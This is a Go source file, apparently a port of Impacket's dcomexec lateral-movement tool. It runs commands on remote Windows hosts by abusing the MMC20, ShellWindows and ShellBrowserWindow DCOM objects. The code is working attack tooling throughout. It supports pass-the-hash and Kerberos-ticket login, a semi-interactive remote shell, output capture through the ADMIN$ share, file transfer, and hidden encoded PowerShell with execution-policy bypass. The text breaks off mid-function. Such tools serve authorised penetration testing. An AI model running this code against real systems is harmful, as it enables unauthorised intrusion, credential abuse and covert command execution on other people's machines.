// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"

	"golang.org/x/text/encoding/ianaindex"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/rs/zerolog"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iactivation/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iobjectexporter/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/oaut"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/oaut/idispatch/v0"

	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
	"github.com/oiweiwei/go-msrpc/ssp/krb5"

	gokrb5config "github.com/oiweiwei/gokrb5.fork/v9/config"
	gokrb5credentials "github.com/oiweiwei/gokrb5.fork/v9/credentials"

	"github.com/oiweiwei/go-msrpc/msrpc/erref/hresult"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"

	"github.com/mandiant/gopacket/pkg/flags"
	"github.com/mandiant/gopacket/pkg/kerberos"
	"github.com/mandiant/gopacket/pkg/session"
	"github.com/mandiant/gopacket/pkg/smb"
	"github.com/mandiant/gopacket/pkg/transport"
)

// IDispatch invoke flags
const (
	CYCLEDISPATCH_METHOD      = 0x00000001
	CYCLEDISPATCH_PROPERTYGET = 0x00000002
)

// DCOM Object CLSIDs
var (
	CLSID_MMC20              = &dcom.ClassID{Data1: 0x49B2791A, Data2: 0xB1AE, Data3: 0x4C90, Data4: []byte{0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89}}
	CLSID_ShellWindows       = &dcom.ClassID{Data1: 0x9BA05972, Data2: 0xF6A8, Data3: 0x11CF, Data4: []byte{0xA4, 0x42, 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39}}
	CLSID_ShellBrowserWindow = &dcom.ClassID{Data1: 0xC08AFD90, Data2: 0xF2A1, Data3: 0x11D1, Data4: []byte{0x84, 0x55, 0x00, 0xA0, 0xC9, 0x1F, 0x38, 0x80}}
)

var (
	objectType = flag.String("object", "ShellWindows", "DCOM object to be used to execute the shell command (default=ShellWindows)")
	noOutput   = flag.Bool("nooutput", false, "whether or not to print the output (no SMB connection created)")
	silentCmd  = flag.Bool("silentcommand", false, "does not execute cmd.exe to run given command (no output, cannot run dir/cd/etc.)")
	timeout    = flag.Int("timeout", 30, "Timeout in seconds waiting for command output")
	share      = flag.String("share", "ADMIN$", "share where the output will be grabbed from (default ADMIN$)")
	shellType  = flag.String("shell-type", "cmd", "choose a command processor for the semi-interactive shell")
	codec      = flag.String("codec", "", "Sets encoding used (codec) from the target's output (default utf-8)")
	comVersion = flag.String("com-version", "", "DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5:7")
)

// Output filename prefix (matches Impacket: __ + first 5 chars of timestamp)
var outputFilename = fmt.Sprintf("__%s", fmt.Sprintf("%d", time.Now().Unix())[:5])

func main() {
	opts := flags.Parse()

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error parsing target string: %v\n", err)
		os.Exit(1)
	}

	opts.ApplyToSession(&target, &creds)

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
	}

	// Validate object type
	objType := strings.ToLower(*objectType)
	switch objType {
	case "mmc20", "shellwindows", "shellbrowserwindow":
		// Valid
	default:
		fmt.Fprintf(os.Stderr, "[-] Invalid object type: %s (use MMC20, ShellWindows, or ShellBrowserWindow)\n", *objectType)
		os.Exit(1)
	}

	// Get command early for validation
	command := opts.Command()

	// Input validation (match Impacket)
	if command == "" && *noOutput {
		fmt.Fprintln(os.Stderr, "[-] -nooutput requires a command to execute")
		os.Exit(1)
	}
	if command == "" && *silentCmd {
		fmt.Fprintln(os.Stderr, "[-] -silentcommand requires a command to execute")
		os.Exit(1)
	}

	// Parse -com-version (supports both colon and dot separators: "5:7" or "5.7")
	var comVer *dcom.COMVersion
	if *comVersion != "" {
		var major, minor uint16
		ver := strings.Replace(*comVersion, ":", ".", 1)
		_, err := fmt.Sscanf(ver, "%d.%d", &major, &minor)
		if err != nil {
			fmt.Fprintln(os.Stderr, "[-] Wrong COMVERSION format, use MAJOR_VERSION:MINOR_VERSION e.g. \"5:7\"")
			os.Exit(1)
		}
		comVer = &dcom.COMVersion{MajorVersion: major, MinorVersion: minor}
	}

	// Setup Logging
	log := zerolog.New(os.Stderr)
	if !opts.Debug {
		log = zerolog.New(io.Discard)
	}

	// Setup Credentials
	fullUser := creds.Username
	if creds.Domain != "" {
		fullUser = creds.Domain + "\\" + creds.Username
	}

	// Security options for dcerpc
	var securityOpts []dcerpc.Option
	securityOpts = append(securityOpts, dcerpc.WithSign())
	// See wmiexec for rationale: tunnel DCERPC dials (and DNS) via pkg/transport.
	securityOpts = append(securityOpts, dcerpc.WithDialer(transport.ContextDialer{}))

	if creds.UseKerberos {
		ccachePath := os.Getenv("KRB5CCNAME")
		if ccachePath == "" {
			localCCache := creds.Username + ".ccache"
			if _, err := os.Stat(localCCache); err == nil {
				ccachePath = localCCache
			}
		}
		if ccachePath == "" {
			fmt.Fprintln(os.Stderr, "[-] Kerberos authentication requires KRB5CCNAME or <username>.ccache file")
			os.Exit(1)
		}

		ccache, err := gokrb5credentials.LoadCCache(ccachePath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to load ccache: %v\n", err)
			os.Exit(1)
		}
		ccCred := credential.NewFromCCache(fullUser, ccache)
		gssapi.AddCredential(ccCred)

		realm := strings.ToUpper(creds.Domain)
		kdc := creds.DCIP
		if kdc == "" {
			kdc = target.IP
		}
		if kdc == "" {
			kdc = target.Host
		}
		// Synthesizer stamps udp_preference_limit=1 + dns_lookup_*=false.
		krb5Conf, err := gokrb5config.NewFromString(kerberos.SynthesizeKrb5Config(realm, kdc))
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to create Kerberos config: %v\n", err)
			os.Exit(1)
		}

		krbConfig := krb5.NewConfig()
		krbConfig.KRB5Config = krb5.ParsedLibDefaults(krb5Conf)
		krbConfig.DCEStyle = true
		// See wmiexec for rationale: tunnel KDC traffic via pkg/transport.
		krbConfig.KDCDialer = kerberos.TransportKDCDialer{}

		gssapi.AddMechanism(ssp.SPNEGO)
		gssapi.AddMechanism(ssp.KRB5)

		securityOpts = append(securityOpts, dcerpc.WithTargetName("host/"+target.Host))
		securityOpts = append(securityOpts, dcerpc.WithSecurityConfig(krbConfig))
	} else if creds.Hash != "" {
		// Pass-the-hash authentication
		ntHash, err := kerberos.ParseHashes(creds.Hash)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Invalid hash format: %v\n", err)
			os.Exit(1)
		}
		gssapi.AddCredential(credential.NewFromNTHash(fullUser, ntHash))
		gssapi.AddMechanism(ssp.NTLM)
		gssapi.AddMechanism(ssp.SPNEGO)
	} else {
		// Password authentication
		gssapi.AddCredential(credential.NewFromPassword(fullUser, creds.Password))
		gssapi.AddMechanism(ssp.NTLM)
		gssapi.AddMechanism(ssp.SPNEGO)
	}

	securityOpts = append(securityOpts, dcerpc.WithLogger(log))

	// Create executor
	executor := &DCOMExec{
		target:       target,
		creds:        &creds,
		objectType:   objType,
		noOutput:     *noOutput,
		silentCmd:    *silentCmd,
		timeout:      *timeout,
		share:        *share,
		shellType:    *shellType,
		comVersion:   comVer,
		codec:        *codec,
		securityOpts: securityOpts,
		log:          log,
		pwd:          `C:\windows\system32`,
		shell:        "cmd.exe",
	}

	// Establish persistent DCOM connection (matches Impacket's run())
	if err := executor.connect(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] DCOM connection failed: %v\n", err)
		os.Exit(1)
	}

	if command == "" {
		executor.interactiveShell()
	} else {
		if *silentCmd {
			// silentcommand: first word = shell, rest = args
			parts := strings.SplitN(command, " ", 2)
			executor.shell = parts[0]
			args := ""
			if len(parts) > 1 {
				args = parts[1]
			}
			if !executor.noOutput {
				args += fmt.Sprintf(" 1> \\\\127.0.0.1\\%s\\%s 2>&1", executor.share, outputFilename)
			}
			err := executor.executeViaDCOM(executor.shell, args, executor.pwd)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[-] Execution failed: %v\n", err)
				executor.cleanup()
				os.Exit(1)
			}
			if !executor.noOutput {
				fmt.Print(executor.getOutput())
			}
		} else {
			output := executor.executeRemote(command, executor.shellType)
			fmt.Print(output)
		}
		// Single command: call Quit and disconnect (matches Impacket's do_exit after onecmd)
		executor.cleanup()
	}
}

// DCOMExec handles remote command execution via DCOM
type DCOMExec struct {
	target       session.Target
	creds        *session.Credentials
	objectType   string
	noOutput     bool
	silentCmd    bool
	timeout      int
	share        string
	shellType    string
	comVersion   *dcom.COMVersion
	codec        string
	securityOpts []dcerpc.Option
	log          zerolog.Logger
	smbClient    *smb.Client
	pwd          string
	shell        string

	// Persistent DCOM connection state (matches Impacket's architecture)
	ctx        context.Context
	epmConn    dcerpc.Conn              // endpoint mapper connection
	oxidConn   dcerpc.Conn              // OXID endpoint connection
	execDisp   idispatch.DispatchClient // IDispatch for executing commands
	execDISPID int32                    // DISPID for ExecuteShellCommand/ShellExecute
	topDisp    idispatch.DispatchClient // top-level IDispatch (iMMC)
	quitDISPID *int32                   // DISPID for Quit (nil for ShellWindows)
	comVer     *dcom.COMVersion         // resolved COM version
}

// connect establishes the persistent DCOM connection and navigates to the exec interface.
// Matches Impacket's DCOMEXEC.run() setup phase.
func (e *DCOMExec) connect() error {
	e.ctx = gssapi.NewSecurityContext(context.Background())

	host := e.target.Host
	if e.target.IP != "" {
		host = e.target.IP
	} else if e.creds.DCIP != "" {
		host = e.creds.DCIP
	}

	// Connect to endpoint mapper (port 135)
	conn, err := dcerpc.Dial(e.ctx, net.JoinHostPort(host, "135"), dcerpc.WithDialer(transport.ContextDialer{}))
	if err != nil {
		return fmt.Errorf("failed to connect to endpoint mapper: %v", err)
	}
	e.epmConn = conn

	// Get server bindings via IObjectExporter
	objExp, err := iobjectexporter.NewObjectExporterClient(e.ctx, conn, e.securityOpts...)
	if err != nil {
		return fmt.Errorf("failed to create object exporter client: %v", err)
	}

	alive2, err := objExp.ServerAlive2(e.ctx, &iobjectexporter.ServerAlive2Request{})
	if err != nil {
		return fmt.Errorf("ServerAlive2 failed: %v", err)
	}

	// Determine COM version
	activationVersion := alive2.COMVersion
	e.comVer = e.comVersion
	if e.comVer == nil {
		e.comVer = &dcom.COMVersion{MajorVersion: 5, MinorVersion: 7}
	}

	// Select CLSID
	var clsid *dcom.ClassID
	switch e.objectType {
	case "mmc20":
		clsid = CLSID_MMC20
	case "shellwindows":
		clsid = CLSID_ShellWindows
	case "shellbrowserwindow":
		clsid = CLSID_ShellBrowserWindow
	}

	// Create remote activation client
	actClient, err := iactivation.NewActivationClient(e.ctx, conn, e.securityOpts...)
	if err != nil {
		return fmt.Errorf("failed to create activation client: %v", err)
	}

	// Activate the COM object
	actResp, err := actClient.RemoteActivation(e.ctx, &iactivation.RemoteActivationRequest{
		ORPCThis:                   &dcom.ORPCThis{Version: activationVersion},
		ClassID:                    clsid.GUID(),
		IIDs:                       []*dcom.IID{idispatch.DispatchIID},
		RequestedProtocolSequences: []uint16{7}, // ncacn_ip_tcp
	})
	if err != nil {
		return fmt.Errorf("RemoteActivation failed: %v", err)
	}

	if actResp.HResult != 0 {
		return fmt.Errorf("RemoteActivation returned HRESULT: 0x%08x (%s)", uint32(actResp.HResult), hresult.FromCode(uint32(actResp.HResult)))
	}

	if len(actResp.InterfaceData) == 0 || actResp.InterfaceData[0] == nil {
		return fmt.Errorf("no interface data returned from activation")
	}

	std := actResp.InterfaceData[0].GetStandardObjectReference().Std

	// Find TCP endpoints
	endpoints := actResp.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")
	if len(endpoints) == 0 {
		return fmt.Errorf("no TCP binding found in OXID bindings")
	}

	// Connect to the OXID endpoint
	// See wmiexec for rationale on the ncacn_ip_tcp prefix.
	oxidConn, err := dcerpc.Dial(e.ctx, "ncacn_ip_tcp:"+host, append(endpoints, dcerpc.WithDialer(transport.ContextDialer{}))...)
	if err != nil {
		return fmt.Errorf("failed to connect to OXID endpoint: %v", err)
	}
	e.oxidConn = oxidConn

	// Create top-level IDispatch client (iMMC)
	dispOpts := append([]dcerpc.Option{dcom.WithIPID(std.IPID)}, e.securityOpts...)
	topDisp, err := idispatch.NewDispatchClient(e.ctx, oxidConn, dispOpts...)
	if err != nil {
		return fmt.Errorf("failed to create IDispatch client: %v", err)
	}
	e.topDisp = topDisp

	// Navigate to exec interface based on object type
	switch e.objectType {
	case "mmc20":
		return e.setupMMC20()
	case "shellwindows":
		return e.setupShellWindows()
	case "shellbrowserwindow":
		return e.setupShellBrowserWindow()
	}

	return fmt.Errorf("unknown object type: %s", e.objectType)
}

// setupMMC20 navigates: iMMC -> Document -> ActiveView -> ExecuteShellCommand
// Also stores Quit DISPID from iMMC.
func (e *DCOMExec) setupMMC20() error {
	cv := e.comVer

	// Get Quit DISPID from top-level iMMC
	quitResp, err := e.topDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
		This: &dcom.ORPCThis{Version: cv}, Names: []string{"Quit"}, NamesCount: 1, LocaleID: 0x409,
	})
	if err == nil && len(quitResp.DispatchID) > 0 {
		id := quitResp.DispatchID[0]
		e.quitDISPID = &id
	}

	// Document
	docResp, err := e.topDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
		This: &dcom.ORPCThis{Version: cv}, Names: []string{"Document"}, NamesCount: 1, LocaleID: 0x409,
	})
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(Document) failed: %v", err)
	}
	docInv, err := e.topDisp.Invoke(e.ctx, &idispatch.InvokeRequest{
		This: &dcom.ORPCThis{Version: cv}, DispatchIDMember: docResp.DispatchID[0],
		LocaleID: 0x409, Flags: CYCLEDISPATCH_PROPERTYGET, DispatchParams: &oaut.DispatchParams{},
	})
	if err != nil {
		return fmt.Errorf("Invoke(Document) failed: %v", err)
	}
	docIPID, err := extractIPIDFromResult(docInv.VarResult)
	if err != nil {
		return fmt.Errorf("Document: %v", err)
	}
	docOpts := append([]dcerpc.Option{dcom.WithIPID(docIPID)}, e.securityOpts...)
	docDisp, err := idispatch.NewDispatchClient(e.ctx, e.oxidConn, docOpts...)
	if err != nil {
		return fmt.Errorf("failed to create Document client: %v", err)
	}

	// ActiveView
	viewResp, err := docDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
		This: &dcom.ORPCThis{Version: cv}, Names: []string{"ActiveView"}, NamesCount: 1, LocaleID: 0x409,
	})
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(ActiveView) failed: %v", err)
	}
	viewInv, err := docDisp.Invoke(e.ctx, &idispatch.InvokeRequest{
		This: &dcom.ORPCThis{Version: cv}, DispatchIDMember: viewResp.DispatchID[0],
		LocaleID: 0x409, Flags: CYCLEDISPATCH_PROPERTYGET, DispatchParams: &oaut.DispatchParams{},
	})
	if err != nil {
		return fmt.Errorf("Invoke(ActiveView) failed: %v", err)
	}
	viewIPID, err := extractIPIDFromResult(viewInv.VarResult)
	if err != nil {
		return fmt.Errorf("ActiveView: %v", err)
	}
	viewOpts := append([]dcerpc.Option{dcom.WithIPID(viewIPID)}, e.securityOpts...)
	viewDisp, err := idispatch.NewDispatchClient(e.ctx, e.oxidConn, viewOpts...)
	if err != nil {
		return fmt.Errorf("failed to create ActiveView client: %v", err)
	}

	// ExecuteShellCommand DISPID
	execResp, err := viewDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
		This: &dcom.ORPCThis{Version: cv}, Names: []string{"ExecuteShellCommand"}, NamesCount: 1, LocaleID: 0x409,
	})
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(ExecuteShellCommand) failed: %v", err)
	}

	e.execDisp = viewDisp
	e.execDISPID = execResp.DispatchID[0]
	return nil
}

// setupShellWindows navigates: iMMC -> Item() -> Document -> Application -> ShellExecute
// ShellWindows has no Quit (pQuit = nil, matching Impacket).
func (e *DCOMExec) setupShellWindows() error {
	cv := e.comVer
	// No Quit for ShellWindows (matches Impacket: pQuit = None)
	e.quitDISPID = nil

	return e.setupShellExec(cv, true) // true = use Item() first
}

// setupShellBrowserWindow navigates: iMMC -> Document -> Application -> ShellExecute
// Also stores Quit DISPID from iMMC.
func (e *DCOMExec) setupShellBrowserWindow() error {
	cv := e.comVer

	// Get Quit DISPID from top-level iMMC
	quitResp, err := e.topDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
		This: &dcom.ORPCThis{Version: cv}, Names: []string{"Quit"}, NamesCount: 1, LocaleID: 0x409,
	})
	if err == nil && len(quitResp.DispatchID) > 0 {
		id := quitResp.DispatchID[0]
		e.quitDISPID = &id
	}

	return e.setupShellExec(cv, false) // false = no Item(), go directly to Document
}

// setupShellExec is the shared setup for ShellWindows and ShellBrowserWindow.
// If useItem is true, calls Item() first (ShellWindows). Otherwise goes directly to Document.
func (e *DCOMExec) setupShellExec(cv *dcom.COMVersion, useItem bool) error {
	var startDisp idispatch.DispatchClient = e.topDisp

	if useItem {
		// Item() — get a shell window
		itemResp, err := e.topDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
			This: &dcom.ORPCThis{Version: cv}, Names: []string{"Item"}, NamesCount: 1, LocaleID: 0x409,
		})
		if err != nil {
			return fmt.Errorf("GetIDsOfNames(Item) failed: %v", err)
		}
		itemInv, err := e.topDisp.Invoke(e.ctx, &idispatch.InvokeRequest{
			This: &dcom.ORPCThis{Version: cv}, DispatchIDMember: itemResp.DispatchID[0],
			LocaleID: 0x409, Flags: CYCLEDISPATCH_METHOD, DispatchParams: &oaut.DispatchParams{},
		})
		if err != nil {
			return fmt.Errorf("Invoke(Item) failed: %v", err)
		}
		itemIPID, err := extractIPIDFromResult(itemInv.VarResult)
		if err != nil {
			return fmt.Errorf("Item: %v", err)
		}
		itemOpts := append([]dcerpc.Option{dcom.WithIPID(itemIPID)}, e.securityOpts...)
		itemDisp, err := idispatch.NewDispatchClient(e.ctx, e.oxidConn, itemOpts...)
		if err != nil {
			return fmt.Errorf("failed to create Item client: %v", err)
		}
		startDisp = itemDisp
	}

	// Document
	docResp, err := startDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
		This: &dcom.ORPCThis{Version: cv}, Names: []string{"Document"}, NamesCount: 1, LocaleID: 0x409,
	})
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(Document) failed: %v", err)
	}
	docInv, err := startDisp.Invoke(e.ctx, &idispatch.InvokeRequest{
		This: &dcom.ORPCThis{Version: cv}, DispatchIDMember: docResp.DispatchID[0],
		LocaleID: 0x409, Flags: CYCLEDISPATCH_PROPERTYGET, DispatchParams: &oaut.DispatchParams{},
	})
	if err != nil {
		return fmt.Errorf("Invoke(Document) failed: %v", err)
	}
	docIPID, err := extractIPIDFromResult(docInv.VarResult)
	if err != nil {
		return fmt.Errorf("Document: %v", err)
	}
	docOpts := append([]dcerpc.Option{dcom.WithIPID(docIPID)}, e.securityOpts...)
	docDisp, err := idispatch.NewDispatchClient(e.ctx, e.oxidConn, docOpts...)
	if err != nil {
		return fmt.Errorf("failed to create Document client: %v", err)
	}

	// Application
	appResp, err := docDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
		This: &dcom.ORPCThis{Version: cv}, Names: []string{"Application"}, NamesCount: 1, LocaleID: 0x409,
	})
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(Application) failed: %v", err)
	}
	appInv, err := docDisp.Invoke(e.ctx, &idispatch.InvokeRequest{
		This: &dcom.ORPCThis{Version: cv}, DispatchIDMember: appResp.DispatchID[0],
		LocaleID: 0x409, Flags: CYCLEDISPATCH_PROPERTYGET, DispatchParams: &oaut.DispatchParams{},
	})
	if err != nil {
		return fmt.Errorf("Invoke(Application) failed: %v", err)
	}
	appIPID, err := extractIPIDFromResult(appInv.VarResult)
	if err != nil {
		return fmt.Errorf("Application: %v", err)
	}
	appOpts := append([]dcerpc.Option{dcom.WithIPID(appIPID)}, e.securityOpts...)
	appDisp, err := idispatch.NewDispatchClient(e.ctx, e.oxidConn, appOpts...)
	if err != nil {
		return fmt.Errorf("failed to create Application client: %v", err)
	}

	// ShellExecute DISPID
	shellExecResp, err := appDisp.GetIDsOfNames(e.ctx, &idispatch.GetIDsOfNamesRequest{
		This: &dcom.ORPCThis{Version: cv}, Names: []string{"ShellExecute"}, NamesCount: 1, LocaleID: 0x409,
	})
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(ShellExecute) failed: %v", err)
	}

	e.execDisp = appDisp
	e.execDISPID = shellExecResp.DispatchID[0]
	return nil
}

// executeViaDCOM invokes the stored exec method with shell, args, and pwd.
// Uses the persistent DCOM connection established by connect().
func (e *DCOMExec) executeViaDCOM(shell, args, pwd string) error {
	cv := e.comVer

	if e.objectType == "mmc20" {
		// ExecuteShellCommand(Command, Directory, Parameters, WindowState)
		// Args in reverse order for DISPPARAMS
		_, err := e.execDisp.Invoke(e.ctx, &idispatch.InvokeRequest{
			This:             &dcom.ORPCThis{Version: cv},
			DispatchIDMember: e.execDISPID,
			LocaleID:         0x409,
			Flags:            CYCLEDISPATCH_METHOD,
			DispatchParams: &oaut.DispatchParams{
				Args: []*oaut.Variant{
					newVariantBSTR("7"),   // WindowState (SW_SHOWMINNOACTIVE)
					newVariantBSTR(args),  // Parameters
					newVariantBSTR(pwd),   // Directory
					newVariantBSTR(shell), // Command
				},
			},
		})
		return err
	}

	// ShellWindows / ShellBrowserWindow: ShellExecute(File, vArgs, vDir, vOperation, vShow)
	_, err := e.execDisp.Invoke(e.ctx, &idispatch.InvokeRequest{
		This:             &dcom.ORPCThis{Version: cv},
		DispatchIDMember: e.execDISPID,
		LocaleID:         0x409,
		Flags:            CYCLEDISPATCH_METHOD,
		DispatchParams: &oaut.DispatchParams{
			Args: []*oaut.Variant{
				newVariantBSTR("0"),   // vShow (SW_HIDE)
				newVariantBSTR(""),    // vOperation
				newVariantBSTR(pwd),   // vDir
				newVariantBSTR(args),  // vArgs
				newVariantBSTR(shell), // File
			},
		},
	})
	return err
}

// executeRemote builds the command with shell wrapping and output redirection,
// executes it via DCOM, and retrieves the output. Matches Impacket's execute_remote().
func (e *DCOMExec) executeRemote(data, shellType string) string {
	var command string

	if shellType == "powershell" {
		// PowerShell: prepend SilentlyContinue, UTF-16LE base64 encode
		psCommand := `$ProgressPreference="SilentlyContinue";` + data
		encoded := encodeUTF16LEBase64(psCommand)
		psPrefix := "powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc "
		command = "/Q /c " + psPrefix + encoded
	} else {
		command = "/Q /c " + data
	}

	if !e.noOutput {
		command += fmt.Sprintf(" 1> \\\\127.0.0.1\\%s\\%s 2>&1", e.share, outputFilename)
	}

	err := e.executeViaDCOM(e.shell, command, e.pwd)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Execution failed: %v\n", err)
		return ""
	}

	if !e.noOutput {
		return e.getOutput()
	}
	return ""
}

func (e *DCOMExec) interactiveShell() {
	fmt.Println("[!] Launching semi-interactive shell - Careful what you execute")
	fmt.Println("[!] Press help for extra shell commands")

	// Initialize: cd to \ to get actual pwd (matches Impacket's do_cd('\\') in __init__)
	e.doCD(`\`)

	prompt := e.buildPrompt()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print(prompt)
		if !scanner.Scan() {
			fmt.Println()
			break
		}
		cmd := strings.TrimSpace(scanner.Text())
		if cmd == "" {
			continue
		}
		if strings.EqualFold(cmd, "exit") {
			break
		}

		// Help
		if strings.EqualFold(cmd, "help") {
			fmt.Println(" lcd {path}                 - changes the current local directory to {path}")
			fmt.Println(" exit                       - terminates the server process (and this session)")
			fmt.Println(" lput {src_file, dst_path}  - uploads a local file to the dst_path (dst_path = default current directory)")
			fmt.Println(" lget {file}                - downloads pathname to the current local dir")
			fmt.Println(" ! {cmd}                    - executes a local shell cmd")
			continue
		}

		// lcd — change local directory
		if strings.HasPrefix(strings.ToLower(cmd), "lcd") {
			args := strings.TrimSpace(cmd[3:])
			if args == "" {
				wd, _ := os.Getwd()
				fmt.Println(wd)
			} else {
				if err := os.Chdir(args); err != nil {
					fmt.Fprintf(os.Stderr, "[-] %v\n", err)
				}
			}
			continue
		}

		// lget — download remote file
		if strings.HasPrefix(strings.ToLower(cmd), "lget") {
			args := strings.TrimSpace(cmd[4:])
			if args == "" {
				fmt.Println("[!] Usage: lget remote_file")
				continue
			}
			e.doLget(args)
			continue
		}

		// lput — upload local file
		if strings.HasPrefix(strings.ToLower(cmd), "lput") {
			args := strings.TrimSpace(cmd[4:])
			if args == "" {
				fmt.Println("[!] Usage: lput src_file [dst_path]")
				continue
			}
			e.doLput(args)
			continue
		}

		// Local shell escape
		if strings.HasPrefix(cmd, "!") {
			localCmd := strings.TrimPrefix(cmd, "!")
			if localCmd == "" {
				fmt.Println("[!] Usage: !command - runs command on local system")
				continue
			}
			out, err := exec.Command("sh", "-c", localCmd).CombinedOutput()
			if err != nil {
				fmt.Fprintf(os.Stderr, "[-] Local command error: %v\n", err)
			}
			fmt.Print(string(out))
			continue
		}

		// cd command
		if strings.HasPrefix(strings.ToLower(cmd), "cd ") || strings.EqualFold(cmd, "cd") {
			args := ""
			if len(cmd) > 2 {
				args = strings.TrimSpace(cmd[3:])
			}
			if args != "" {
				e.doCD(args)
			}
			prompt = e.buildPrompt()
			continue
		}

		// Drive change (e.g. "D:")
		if len(cmd) == 2 && cmd[1] == ':' {
			e.doDriveChange(cmd)
			prompt = e.buildPrompt()
			continue
		}

		// Normal command execution
		output := e.executeRemote(cmd, e.shellType)
		fmt.Print(output)
	}

	e.cleanup()
}

// doCD changes the remote working directory, matching Impacket's do_cd.
func (e *DCOMExec) doCD(path string) {
	// Execute 'cd <path>' remotely to check for errors
	output := e.executeRemote("cd "+path, "cmd")
	output = strings.TrimSpace(output)
	if output != "" {
		// Output means error (cd normally produces no output on success)
		fmt.Println(output)
		return
	}
	// Success — compute new pwd by joining with current pwd, then verify
	e.pwd = ntpathNormpath(ntpathJoin(e.pwd, path))
	// Run bare 'cd' with the new pwd as working directory to get actual path
	output = e.executeRemote("cd", "cmd")
	output = strings.TrimSpace(strings.ReplaceAll(output, "\r\n", "\n"))
	if output != "" {
		lines := strings.Split(output, "\n")
		lastLine := strings.TrimSpace(lines[len(lines)-1])
		if lastLine != "" {
			e.pwd = lastLine
		}
	}
}

// doDriveChange handles drive letter changes like "D:" in interactive shell.
func (e *DCOMExec) doDriveChange(drive string) {
	output := e.executeRemote(drive, "cmd")
	output = strings.TrimSpace(output)
	if output != "" {
		// Output means error
		fmt.Println(output)
		return
	}
	// Success — set pwd to drive letter, then verify
	e.pwd = drive
	output = e.executeRemote("cd", "cmd")
	output = strings.TrimSpace(strings.ReplaceAll(output, "\r\n", "\n"))
	if output != "" {
		lines := strings.Split(output, "\n")
		lastLine := strings.TrimSpace(lines[len(lines)-1])
		if lastLine != "" {
			e.pwd = lastLine
		}
	}
}

// doLget downloads a remote file to the current local directory.
func (e *DCOMExec) doLget(srcPath string) {
	if err := e.ensureSMBClient(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] SMB error: %v\n", err)
		return
	}

	// Join with remote pwd and normalize
	fullPath := ntpathNormpath(ntpathJoin(e.pwd, srcPath))
	drive, tail := ntpathSplitdrive(fullPath)
	if drive == "" {
		fmt.Fprintln(os.Stderr, "[-] Could not determine drive letter from path")
		return
	}

	// Mount the drive share (e.g. C: -> C$)
	driveShare := drive[:len(drive)-1] + "$"
	origShare := e.share

	if err := e.smbClient.UseShare(driveShare); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to access share %s: %v\n", driveShare, err)
		return
	}

	localName := filepath.Base(ntpathBasename(fullPath))
	// Remove leading backslash from tail for SMB path
	smbPath := strings.TrimPrefix(tail, `\`)
	err := e.smbClient.Get(smbPath, localName)

	// Restore original share
	e.smbClient.UseShare(origShare)

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error downloading %s: %v\n", fullPath, err)
		os.Remove(localName)
		return
	}
	fmt.Printf("[*] Downloaded %s to %s\n", fullPath, localName)
}

// doLput uploads a local file to a remote path.
func (e *DCOMExec) doLput(args string) {
	if err := e.ensureSMBClient(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] SMB error: %v\n", err)
		return
	}

	parts := strings.SplitN(args, " ", 2)
	srcFile := parts[0]
	dstPath := ""
	if len(parts) > 1 {
		dstPath = strings.TrimSpace(parts[1])
	}

	// Build remote path
	srcBasename := filepath.Base(srcFile)
	fullPath := ntpathNormpath(ntpathJoin(e.pwd, dstPath, srcBasename))
	drive, tail := ntpathSplitdrive(fullPath)
	if drive == "" {
